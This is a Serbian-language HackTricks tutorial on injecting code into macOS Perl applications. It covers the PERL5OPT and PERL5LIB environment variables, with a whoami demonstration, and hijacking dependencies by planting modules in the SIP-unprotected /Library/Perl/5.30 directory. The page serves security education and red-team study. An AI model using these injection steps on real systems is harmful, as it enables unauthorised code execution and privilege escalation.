# macOS Ubacivanje Perl aplikacija

{% hint style="success" %}
Naučite i vežbajte hakovanje AWS-a:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Obuka AWS Crveni Tim Stručnjak (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naučite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Obuka GCP Crveni Tim Stručnjak (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Putem `PERL5OPT` & `PERL5LIB` env promenljive

Korišćenjem env promenljive PERL5OPT moguće je naterati perl da izvrši proizvoljne komande.\
Na primer, kreirajte ovaj skript:

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

Sada **izvezite env promenljivu** i izvršite **perl** skriptu:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Druga opcija je da se kreira Perl modul (npr. `/tmp/pmod.pm`):

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

Zatim koristite env promenljive:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Preko zavisnosti

Moguće je izlistati redosled foldera zavisnosti Perl-a koji se izvršava:
```bash
perl -e 'print join("\n", @INC)'
```
Koji će vratiti nešto slično:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Neke od vraćenih mapa čak ne postoje, međutim, **`/Library/Perl/5.30`** **postoji**, nije **zaštićen** od strane **SIP**-a i nalazi se **ispred** mapa **zaštićenih SIP-om**. Stoga, neko bi mogao zloupotrebiti tu mapu da bi dodao zavisnosti skripta tamo kako bi visoko privilegovani Perl skript učitao te zavisnosti.

{% hint style="warning" %}
Međutim, imajte na umu da **morate biti root da biste pisali u tu mapu** i danas ćete dobiti ovaj **TCC prozor**:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

Na primer, ako skript uvozi **`use File::Basename;`** bilo bi moguće kreirati `/Library/Perl/5.30/File/Basename.pm` da bi se izvršio proizvoljni kod.

## Reference

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)
